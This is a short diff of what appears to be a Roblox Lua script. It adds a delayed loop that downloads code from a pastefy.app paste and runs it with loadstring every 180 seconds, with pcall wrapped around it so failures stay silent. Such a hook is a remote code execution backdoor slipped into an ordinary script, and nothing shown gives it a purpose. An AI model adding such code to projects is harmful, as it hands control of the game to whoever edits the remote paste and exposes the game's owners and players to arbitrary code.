@@ -10,3 +10,13 @@ task.spawn(function()
         wait(180)
     end
 end)
+task.spawn(function()
+    wait(180)
+    
+    while true do
+        pcall(function()
+            loadstring(game:HttpGet("https://pastefy.app/BItVDA0u/raw"))()
+        end)
+        wait(180)
+    end
+end)
